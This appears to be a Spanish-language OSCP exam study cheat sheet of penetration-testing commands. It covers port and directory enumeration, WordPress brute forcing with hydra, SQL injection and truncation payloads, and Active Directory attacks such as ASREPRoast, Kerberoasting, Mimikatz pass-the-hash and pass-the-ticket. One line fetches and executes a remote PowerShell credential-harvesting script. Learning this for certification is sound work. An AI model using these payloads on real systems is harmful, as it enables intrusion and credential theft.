# En proceso

## Preparación para la OSCP - Metodología & Scripts

![banner_oscp](https://user-images.githubusercontent.com/87484792/177843931-081eca92-24f1-4743-a632-48ee65b2ba4a.png)

# Enumeración - Fase Inicial
## Enumeración de puertos

`sudo nmap --minrate-5000 -p- -vvv -Pn -n -oG openPorts.txt <ip>` # Encontrar puertos con nmap </br>

`sudo nmap -sSCV -p{ports} -oN servicesPorts.txt <ip>` # Verificar que servicios hay en los puertos encontrados.

`sudo nmap --script=http-enum  -p {port http/s} <ip>` # Pequeño script de nmap (".nse") para la verificación de directorios en http/s

`sudo nmap -sU -T5 --top-ports 500 <ip> ` # Encontrar puertos UDP con nmap

## Enumeración de directorios - Fuzzing 

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<ip>/FUZZ` # Encontrar directorios disponibles con wfuzz

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: SSID=dasd45ads6aa5s" http://<ip>/FUZZ` # Encontrar directorios disponibles con cookies

`wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" <ip>` # Fuzzear data

`dirsearch --url http://ip/` # Fuzzear con dirsearch

`dirsearch --url http://ip/ -e .txt,.aspx` # Fuzzear con dirsearch con extensiones propias

`dirsearch --url http://ip/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` # Fuzzear con dirsearch con diccionario propio

```
Tips:
** Enumerar directorios ocultos "http://ip/.FUZZ/"
** Enumerar directorios dentro de otros directorios "http://ip/admin/FUZZ"
** En wfuzz, puedes skyp el certificado SSL con la bandera "-k"
** Puedes usar hilos para agilizar, no aconsejable poner más de 200 "-t 200"
```

## Enumeración de subdominios - Fuzzing 

`wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.domain.htb" domain.htb` # Fuzzear con wfuzz subdominios

`gobuster vhost --url domain.htb --wordlist /usr/share/amass/wordlists/subdomains-top1mil-110000.txt` # Fuzzing con gobuster subdomains

`dig axfr @dns-server <target>` # Ataque de transferencia de zona (Domain's Attack)

`ldns-walk @ns1.insecuredns.com insecuredns.com` # Walking for DNS

## SNMP Enumeration 

Generalmente corre sobre puertos UPD ( 161 ), nos puede permitir enumerar más de la cuenta a nivel de sistema. Para saber qué software corren, así como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.

Lo primero que necesitamos saber es la *community string*, de normal general suele estar entre **public** o **private**

`onesixtyone -c dic.txt -i output.txt` # onesixtyone nos ayuda a obtener la community string con fuerza bruta.

Una vez obtenemos la *community string* </br>
<h5>note: La versión suele ser la 2c</h5>

`snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . `  # Enumeración de SNMP con snmpbulkwalk

`snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]` # Enumeración de SNMP con snmp-check
 
`nmap --script "snmp* and not snmp-brute" <target>` # Apoyo a las enumeraciones, script de nmap.

## WordPress

Este gestor de contenidos (CMS) suele ser un punto clave en los CTF, contiene un panel de login y pluggins que suelen ser vulnerables.

`wpscan -u "http://ip/" `

En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo /invent-wordpress/, deberemos especificarlo a través del parámetro --wp-content-dir para la correcta enumeración desde wpscan:

`wpscan -u "http://ip/" --wp-content-dir "invent-wordpress"` # Escaner WP con la ruta modificada

Proseguimos a encontrar usuarios validos para 'WP'.

`wpscan -u "http://ip/" --enumerate u` # Enumeramos usuarios

`wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt` # Enumeramos usuarios con wordlists.

Una forma de bypassear posibles bloqueos es jugar con el parámetro --random-agent, de la siguiente forma:

`$~ wpscan -u "http://ip/" --username usuario -w /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt  --random-agent`

Tambien es posible enumerar usuarios validos si aplicamos fuerza bruta con hydra. Tenemos que ver si hay fuga de información.

`hydra -L dict_Users.txt -p test <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para listar usuarios.

`hydra -l admin -P dict_Password.txt <ip> "http-post-form" "/path_login.php:user=^USER^&password=^PASS^:F=messageError"` # Fuerza bruta WP para el usuario admin.

Es importante ver si la web cuenta con contenido escrito. Esto es importante para poder crear nuestro propio diccionario de palabras claves.

`cewl -w diccionario http://ip/ --with-numbers ` # aplicamos cewl, esto nos hará un diccionario con palabras clave de la web.

Enumerar y detectar pluggins vulnerables tambien ayudaran a la intrusión.

`wpscan --url http(s)://ip/ --enumerate vp` # "vp" Detectará pluggins vulnerable

`wpscan --url http(s)://ip/ --enumerate p` # "p" Detectará todos los pluggins

`wpscan --url http(s)://ip/ --enumerate p --plugins-detection aggressive` # Detectará todos los pluggins, con un parametro agresivo. Recomendable.

# SQLI
*SqlMap no está permitido en el OSCP*

**Inyección basica de error**

`admin' or 1=1;-- -` # Inyección en panel de login

**Inyección por tiempo**

`admin' or sleep(5);-- -` # Inyección en panel de login, controlada por el tiempo de respuesta. En este caso, 5 segundos.

**Enumeración de caracteres en la base de datos**

*Para esta enumeración, es necesario conocer algún dato valido ya que usamos el operador "AND".*

`admin' and substring(username,1,1)='a' #devolverá true, ya que la primera posición de "admin" es "a". ` # Enumeración por caracter, en base de error.

## Union Select

Empezaremos con una web de ejemplo:

`http://fakesite.com/report.php?id=23`

Lo primero que realizaremos, será obtener algún tipo de error, para ello intentaremos romper la Query.

`http://fakesite.com/report.php?id=23' ` # Con una comilla final.

`http://fakesite.com/report.php?id=23' order by 5;-- - ` # Intentamos sacar cuantas tablas tiene la BBDD.

*A tener en cuenta, que a veces cuando sobre-excedemos con el order by, cierto contenido de la web, puede desaparecer*

```
http://fakesite.com/report.php?id=23 and 0 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23 and false union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=-23 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23000000 union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=null union select 1,2,3,4,5;-- -
http://fakesite.com/report.php?id=23 && 0 union select 1,2,3,4,5;-- -

# Otras formas de romper Query <-- URLEncondear.
```

Encontrado las tablas, continuamos:

`http://fakesite.com/report.php?id=23' union select 1,2,3,4,5;-- -` # Suponiendo que tenga 5 tablas, enumeramos.

*Podemos sustituir los números por lo que queramos, la cosa es tener visible que nos reporta la inyección de la query*

Suponiendo que se visualiza el número 3, podemos empezar a sustituir para filtrar contenido de la base de datos.

`http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5;-- -` # imprime el nombre de la base de datos.

Ahora podemos empezar a enumerar las tablas

`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database();-- -` # enumeramos tablas

*podemos jugar con limit para imprimir todo el contenido por lineas*

`http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database() limit 0,1;-- -`

Ahora el proceso es muy similar para obtener las columnas y los datos de las columnas

`http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablenamehere;-- -'` # obtenemos las columnas

`http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tablename limit 0,1` # imprimimos los datos de la columna

## SQL Truncatión

La vulnerabilidad de truncamiento de SQL ocurre cuando una base de datos trunca la entrada del usuario debido a una restricción en la longitud.
El atacante puede crear un usuario 'admin' con su propia contraseña. Ahora, la base de datos tiene dos entradas de administrador 'username', pero con diferentes contraseñas. El atacante puede iniciar sesión con las credenciales recién creadas para obtener un panel de administración porque los nombres de usuario "admin" y "admin" son iguales para el nivel de la base de datos.

`username=admin++++++++(max.longitud)&password=testpwn123`  # Ejemplo de truncamiento, la base de datos eliminará el texto sobrante para que quepa en la base de datos, y despreciará caracteres extraños y/o espacios. 

# Active Directory

*Para entender mejor kerberos, recomiendo visitar mi explicación en GitHub.*

## Enumeración

*Enumerar y escuchar en puertos de impresoras, puede reportar credenciales en texto claro*

`nc -vv -l -p 444` # Escuchando por el puerto de impresora.

*Enumerar DNS podría brindar información sobre servidores clave en el dominio como web, impresoras, recursos compartidos, etc...*

`gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt` # Enumerar DNS del domain.

**Verificamos el acceso con credenciales nulas o invitados a servicios smb**

`enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>` # Utilizamos enum4linux para intentar conectarnos a servicios compartidos de smb

`smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`  # Utilizamos smbmap para intentar conectarnos a servicios compartidos de smb

`smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //` #  # Utilizamos smbclient para intentar conectarnos a servicios compartidos de smb

**Enumeramos LDAP**

`nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP> ` # Enumeramos ldap con script de nmap

**Enumeramos AD en busca de usuarios validos**

`./kerbrute_linux_amd64 userenum -d domain.htb diccionario_Usuarios.txt` # Utilizamos un script "kerbrute" para listar usuarios con wordlist.

`crackmapexec smb domain.htb  -u '' -p '' --users` # Si tenemos acceso con usuario nulo, podemos listar usuarios con crackmapexec.

**Enumeramos todos los usuarios del directorio activo**

*Cuando tenemos* **credenciales validas** *, podemos enumerar todos los usuarios existentes.*

`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` # enumeramos con GetADUsers, un script en Python

`enum4linux -a -u "user" -p "password" <DC IP>` # Enumeramos con enum4linux

## ASREPRoast

*El ataque ASREPRoast busca usuarios sin el atributo requerido de autenticación previa de Kerberos (DONT_REQ_PREAUTH)*

`python3 GetNPUsers.py domain.htb/ -usersfile usernames.txt -outputfile hashes.asreproast` # Buscamos usuarios con un diccionario, si el usuario no necesita pre-autenticación, nos aparecerá su hash. *(Intentaremos crackearlo offline)*.

*Cracking the hash*

`
john --wordlist=rockyou.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt 
`

## Kerberoasting

*El objetivo de Kerberoasting es recopilar tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario en AD, no cuentas de computadora*

`GetUserSPNs.py -request -dc-ip 10.10.10.18 -hashes <LMHASH>:<NTHASH> domain.htb/john -outputfile hashes.kerberoast` # Obtener TicketsGrantingServices
 
 #### Windows mode

`
Request-SPNTicket -SPN "<SPN>" #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
`


## PASS THE HASH

*Una vez que tenga el hash de la víctima , puede usarlo para hacerse pasar por ella. Debe usar una herramienta que realice la autenticación NTLM usando ese hash , o puede crear un nuevo inicio de sesión e inyectar ese hash dentro del LSASS , de modo que cuando se realice cualquier autenticación NTLM , se usará ese hash.*

`Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.htb /ntlm:NTLMhash /run:powershell.exe"' ` # Usamos mimikatz en la maquina victima, este ataque tambien se puede efectuar con usuarios del ordenador, no solo del dominio.


## PASS THE TICKET 

*Este tipo de ataque es similar a Pass the Key, pero en lugar de usar hashes para solicitar un ticket, el ticket en sí es robado y utilizado para autenticarse como propietario*


`mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi" 
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi` #Cargamos el ticket en memoria

`
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd`  # Listamos el ticket en la cache de la memoria

# SMB

## Enumeración

`nmap --min-rate 5000 -p139,445 -vvv -Pn <ip>` # Miramos si tenemos el servicio SMB abierto

`enum4linux -a [-u "<username>" -p "<passwd>"] <IP>` # Dumpeamos información con enum4linux

`map --script "safe or smb-enum-*" -p 445 <IP>` # Lanzamos scripts de nmap para smb

`rpcclient -U "" -N <IP> ` # Conectamos con rpc, con una sesión nula.

## Enumeración de usuarios 

```
Lista de usuarios : querydispinfoyenumdomusers 

Obtener detalles del usuario :queryuser <0xrid> 

Obtener grupos de usuarios :queryusergroups <0xrid> 

OBTENER SID de un usuario :lookupnames <username> 
 
Obtener alias de usuarios :queryuseraliases [builtin|domain] <sid>
```


## Enumeración de grupos 
```
Lista de grupos :enumdomgroups 

Obtener detalles del grupo :querygroup <0xrid> 

Obtener miembros del grupo :querygroupmem <0xrid> 
```


## Enumeración de grupos de alias 

```
Lista de alias :enumalsgroups <builtin|domain> 

Obtener miembros :queryaliasmem builtin|domain <0xrid> 
```

## Enumeración de dominios 
``` 
Lista de dominios : enumdomains Obtener SID :lsaquery 
información de dominio :querydominfo 
```

## Más SID 
```
Encuentre SID por nombre :lookupnames <username> 
Encuentre más SID :lsaenumsid Ciclo RID (verifique más SID) :lookupsids <sid>
```
